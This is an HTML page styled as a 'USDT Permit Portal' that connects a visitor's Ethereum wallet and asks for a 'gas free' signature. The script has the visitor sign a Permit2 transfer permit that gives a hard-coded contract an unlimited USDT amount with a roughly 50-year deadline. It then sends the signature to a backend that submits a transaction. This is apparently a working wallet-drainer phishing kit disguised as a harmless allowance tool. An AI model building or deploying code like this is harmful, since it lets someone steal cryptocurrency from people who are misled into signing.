<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Allowance Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .card { background: #1e293b; border-radius: 16px; padding: 32px; max-width: 480px; width: 100%; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
        h2 { font-size: 22px; text-align: center; margin-bottom: 20px; color: #38bdf8; }
        .details { background: #0f172a; padding: 16px; border-radius: 10px; font-size: 13px; margin-bottom: 20px; border: 1px solid #334155; }
        .details div { margin-bottom: 8px; word-break: break-all; }
        .details div:last-child { margin-bottom: 0; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-bottom: 12px; }
        .btn-connect { background: #3b82f6; color: white; }
        .btn-connect:hover { background: #2563eb; }
        .btn-sign { background: #10b981; color: white; }
        .btn-sign:hover { background: #059669; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { padding: 12px; border-radius: 8px; font-size: 13px; text-align: center; display: none; word-break: break-all; }
        .status.info { display: block; background: #1e3a8a; color: #93c5fd; }
        .status.success { display: block; background: #064e3b; color: #6ee7b7; }
        .status.error { display: block; background: #7f1d1d; color: #fca5a5; }
    </style>
</head>
<body>

<div class="card">
    <h2>USDT Permit Portal</h2>
    
    <div class="details">
        <div><strong>Contract:</strong> 0xb69E225117d428a0b349BAB76368c68012Df1837</div>
        <div><strong>Treasury:</strong> 0xB70a8100a45a28b605dbfb34d713071e21A57D28</div>
        <div><strong>Status:</strong> <span id="userAddr">Disconnected</span></div>
    </div>

    <button id="connectBtn" class="btn btn-connect">🔗 Connect Wallet</button>
    <button id="signBtn" class="btn btn-sign" disabled>✍️ Sign Allowance (Gas Free)</button>

    <div id="statusBox" class="status"></div>
</div>

<script>
    const CONFIG = {
        contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837",
        permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        chainId: 1
    };

    let provider, signer, userAddress;

    const connectBtn = document.getElementById('connectBtn');
    const signBtn = document.getElementById('signBtn');
    const statusBox = document.getElementById('statusBox');
    const userAddr = document.getElementById('userAddr');

    function setStatus(msg, type = 'info') {
        statusBox.className = `status ${type}`;
        statusBox.textContent = msg;
    }

    async function connectWallet() {
        if (!window.ethereum) return setStatus('MetaMask is not installed!', 'error');
        try {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();

            const net = await provider.getNetwork();
            if (net.chainId !== CONFIG.chainId) return setStatus('Please switch to Ethereum Mainnet!', 'error');

            userAddr.textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
            connectBtn.disabled = true;
            connectBtn.textContent = '✅ Connected';
            signBtn.disabled = false;
            setStatus('Wallet connected! Ready to sign.', 'success');
        } catch (err) {
            setStatus(err.message, 'error');
        }
    }

    async function signAndApprove() {
        try {
            signBtn.disabled = true;
            setStatus('Fetching Nonce from Permit2...', 'info');

            const permit2Contract = new ethers.Contract(
                CONFIG.permit2Address,
                ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
                provider
            );

            const allowanceData = await permit2Contract.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
            const nonce = allowanceData.nonce;
            const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * 50); // 50 years

            setStatus('Please sign the message in MetaMask...', 'info');

            const domain = {
                name: "Permit2",
                version: "1",
                chainId: CONFIG.chainId,
                verifyingContract: CONFIG.permit2Address
            };

            const types = {
                PermitTransferFrom: [
                    { name: "permitted", type: "TokenPermissions" },
                    { name: "spender", type: "address" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ],
                TokenPermissions: [
                    { name: "token", type: "address" },
                    { name: "amount", type: "uint256" }
                ]
            };

            const message = {
                permitted: {
                    token: CONFIG.usdtAddress,
                    amount: ethers.constants.MaxUint256.toString()
                },
                spender: CONFIG.contractAddress,
                nonce: nonce.toString(),
                deadline: deadline.toString()
            };

            const signature = await signer._signTypedData(domain, types, message);

            setStatus('Submitting signature to Vercel backend...', 'info');

            const response = await fetch('/api/submit-signature', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user: userAddress,
                    nonce: nonce.toString(),
                    deadline: deadline.toString(),
                    signature: signature
                })
            });

            const result = await response.json();

            if (result.success) {
                setStatus(`✅ Success! Tx Hash: ${result.txHash}`, 'success');
            } else {
                setStatus(`❌ Backend Error: ${result.error}`, 'error');
                signBtn.disabled = false;
            }

        } catch (err) {
            setStatus(`Error: ${err.message}`, 'error');
            signBtn.disabled = false;
        }
    }

    connectBtn.addEventListener('click', connectWallet);
    signBtn.addEventListener('click', signAndApprove);
</script>

</body>
</html>
